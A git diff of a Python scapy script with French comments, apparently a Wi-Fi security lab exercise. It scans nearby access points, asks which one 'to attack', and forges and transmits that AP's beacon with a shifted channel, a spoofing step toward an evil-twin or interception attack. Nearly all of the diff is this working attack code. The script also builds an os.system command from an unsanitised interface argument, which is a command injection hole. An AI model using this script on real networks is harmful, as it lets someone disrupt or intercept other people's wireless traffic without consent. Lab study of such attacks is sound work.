@@ -1,4 +1,7 @@
-#based : https://www.thepythoncode.com/code/building-wifi-scanner-in-python-scapy
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+#based on : https://www.thepythoncode.com/code/building-wifi-scanner-in-python-scapy
 
 from scapy.all import *
 from threading import Thread
@@ -13,9 +16,9 @@ parser.add_argument("seconds", help="time in seconds to sniff before selecting",
 args = parser.parse_args()
 counter = 0
 
-# initialize the networks dataframe that will contain all access points nearby
+# On fait un dataframe pour un affichage plus pertinent
 networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Beacon"])
-# set the index BSSID (MAC address of the AP)
+# Un AP est identifié par son BSSID donc on le met en index
 networks.set_index("BSSID", inplace=True)
 
 def callback(packet):
@@ -36,20 +39,22 @@ def callback(packet):
         networks.loc[bssid] = (ssid, dbm_signal, channel, packet)
 
 
-
+# Routine d'affichage que l'on arrête grâce au flag stop_print
 def print_all():
     global stop_print
     while True:
         if stop_print:
             break;
         os.system("clear")
-        print(networks[["SSID","Channel"]])
+        print(networks[["SSID","Channel", "dBm_Signal"]])
         time.sleep(0.5)
 
 
+# Channel hopping pour gagner en efficacité
 def change_channel():
     ch = 1
     while True:
+        # Changement de channel de l'interface à l'aide de la commande système iwconfig
         os.system("iwconfig " + args.interface + " channel " + str(ch))
         ch = ch % 14 + 1
         time.sleep(0.5)
@@ -58,30 +63,42 @@ def change_channel():
 if __name__ == "__main__":
     stop_print=False
 
-    # start the thread that prints all the networks
+    # Initialisation du thread d'affichage
     printer = Thread(target=print_all)
+    # La flag daemon permet au programme de s'arrêter même si des threads daemon sont encore en cours
     printer.daemon = True
     printer.start()
-    # start the channel changer
+
+    # Initialisation du thread de channel hopping
     channel_changer = Thread(target=change_channel)
     channel_changer.daemon = True
     channel_changer.start()
 
-    # start sniffing
+    # Démarrage du sniff (bloquanr) qui s'arrêtera après le nombre de secondes donné en argument
     sniff(prn=callback, iface=args.interface, timeout=args.seconds)
     stop_print = True
-    input = raw_input("\nChoisir un AP a attaquer : ")
-    APToAttack = networks.loc[input , : ]
-    ChannelToAttack =  APToAttack.Channel + 6 % 14
-    print("Channel %d: Channel to attack %s", APToAttack.Channel, chr(ChannelToAttack))
-    
+
+    # On affiche à nouveau le tableau proprement
+    time.sleep(0.5)
+    os.system("clear")
+    print(networks[["SSID", "Channel", "dBm_Signal"]])
+
+    input = raw_input("\nChoisir un AP a attaquer via son adresse MAC: ")
+
+    # On récupère les infos sur l'AP à attaquer grâce à l'input utilisateur
+    try:
+        APToAttack = networks.loc[input , : ]
+    except:
+        print "L'AP demandé n'existe pas."
+        sys.exit()
+
+    # On décale le channel du beacon comme demandé
+    ChannelToAttack = (APToAttack.Channel + 6) % 14
+
+    # Découpage du paquet : On va récupérer les couches supérieures et inférieurs à celle de la channel et la recréer dans un nouveau paquet
     post = APToAttack.Beacon.getlayer(6)
-    APToAttack.Beacon.getlayer(4).remove_payload()                                                                                                                                                                                                             
+    APToAttack.Beacon.getlayer(4).remove_payload()
+    # C'est ici qu'on recrée la couche de la channel
     forged = APToAttack.Beacon / Dot11Elt(ID="DSset", len=1, info=chr(ChannelToAttack)) / post
 
-    print(forged.summary())
-    send(forged, loop=1)
-
-
-    #generate beacon 
-    
+    send(forged, count=100)
